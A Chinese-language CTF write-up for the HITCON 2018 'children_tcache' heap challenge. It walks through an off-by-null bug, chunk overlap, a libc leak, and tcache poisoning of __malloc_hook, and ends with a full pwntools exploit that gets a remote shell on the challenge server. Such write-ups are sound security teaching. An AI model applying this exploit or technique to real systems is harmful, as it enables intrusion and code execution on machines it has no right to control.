# BUU-hitcon2018_children_tcache

## checksec

```shell
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

## IDA

**add**

```c
unsigned __int64 add()
{
  int i; // [rsp+Ch] [rbp-2034h]
  char *dest; // [rsp+10h] [rbp-2030h]
  unsigned __int64 size; // [rsp+18h] [rbp-2028h]
  char s[8216]; // [rsp+20h] [rbp-2020h] BYREF
  unsigned __int64 v5; // [rsp+2038h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  memset(s, 0, 0x2010uLL);
  for ( i = 0; ; ++i )
  {
    if ( i > 9 )
    {
      puts(":(");
      return __readfsqword(0x28u) ^ v5;
    }
    if ( !heap_array[i] )
      break;
  }
  printf("Size:");
  size = sub_B67();
  if ( size > 0x2000 )
    exit(-2);
  dest = (char *)malloc(size);
  if ( !dest )
    exit(-1);
  printf("Data:");
  sub_BC8(s, (unsigned int)size);
  strcpy(dest, s);                              // off-by-null
  heap_array[i] = dest;
  size_array[i] = size;
  return __readfsqword(0x28u) ^ v5;
}
```

**show**

```c
int show()
{
  __int64 v0; // rax
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  printf("Index:");
  v2 = sub_B67();
  if ( v2 > 9 )
    exit(-3);
  v0 = heap_array[v2];
  if ( v0 )
    LODWORD(v0) = puts((const char *)heap_array[v2]);
  return v0;
}
```

**dele**

```c
int dele()
{
  unsigned __int64 v1; // [rsp+8h] [rbp-8h]

  printf("Index:");
  v1 = sub_B67();
  if ( v1 > 9 )
    exit(-3);
  if ( heap_array[v1] )
  {
    memset((void *)heap_array[v1], 218, size_array[v1]);
    free((void *)heap_array[v1]);
    heap_array[v1] = 0LL;
    size_array[v1] = 0LL;
  }
  return puts(":)");
}
```

漏洞是`off-by-null`，而远程的libc还没有tcache的`double free`的检查。通过`off-by-one`，我们能做到清空下一个chunk的`prev_inuse`位，这点可以导致`overlapping`。

首先，申请三个chunk。chunk_0和chunk_2要是large bin，这样就不会进入tcache中，我们通过chunk_1，清除chunk_2的`prev_inuse`位，并将prev_size域设为`chunk_0+chunk_1`的大小，让chunk_2认为前面有一块巨大的更大的chunk。在做这一步之前，要首先将chunk_0 free掉，不然在后续的free中会出现size与prev_size的不匹配，导致程序退出。

之后free掉chunk_2，此时这三个chunk被合并加入了`unsorted bin`中，然后，申请和最开始chunk_0同样大小的chunk，`unsorted bin`中的chunk被分割，原本的chunk_1+chunk_2被加入`unsorted bin`。注意，这时chunk_1还在被我们使用中，所以可以通过`show`来leak libc。

接着，想办法控制程序执行流。再次，将chunk_1申请回来，这样我们就有两个chunk，指向chunk_1，使用`tcache_psisoning`获得`__malloc_hook`附近的chunk，填入one_gadget，从而get shell。

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
from struct import pack
leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
context.arch="amd64"
local=0
binary='./HITCON_2018_children_tcache'
#gdb.attach(sh)
if local:
    context.log_level="DEBUG"
    sh=process(binary)
else:
	sh=remote('node3.buuoj.cn',25968)

elf = ELF(binary,checksec=False)
#libc = ELF('./libc-2.27.so',checksec=False)
heap_array=0x202060
free_got = elf.got['free']

def add(size, content):
    sh.recvuntil('choice: ')
    sh.sendline('1')
    sh.sendlineafter('Size:', str(size))
    sh.sendlineafter('Data:', str(content))

def show(idx):
    sh.recvuntil('choice: ')
    sh.sendline('2')
    sh.sendlineafter('Index:', str(idx))

def free(idx):
    sh.recvuntil('choice: ')
    sh.sendline('3')
    sh.sendlineafter('Index:', str(idx))

add(0x4f8,'a') #0 0x500
add(0x78,'b')   #1  0x80
add(0x4f8,'c') #2 0x500
add(0x18,'/bin/sh\x00') #3

free(1)
free(0)
#clear chunk_3's prev_inuse bit

for i in range(0,8):
    add((0x78-i),'a'*(0x78-i)) #0 0x80
    free(0)

add(0x78,'b'*0x70+p64(0x580))   #0  0x80

free(2)
add(0x4f8,'c'*0x4f7) #1
#gdb.attach(sh)
show(0)

main_arena = u64(sh.recvuntil('\x7f').ljust(8,'\x00'))-96
malloc_hook = main_arena-0x10
libc=LibcSearcher('__malloc_hook',malloc_hook)
libcbase=malloc_hook-libc.dump('__malloc_hook')
one_gadget = libcbase + 0x4f322
leak('libcbase',libcbase)

add(0x78,'a') #2
free(0)
free(2)
add(0x78,p64(malloc_hook)) #0
add(0x78,p64(malloc_hook)) #2
add(0x78,p64(one_gadget)) #4

sh.recvuntil('choice: ')
sh.sendline('1')
sh.sendlineafter('Size:', str(12))

sh.interactive()
```

注意`strcpy`本身会被'\x00'截断，所以通过循环`off-by-null`的方式修改`prev_size`。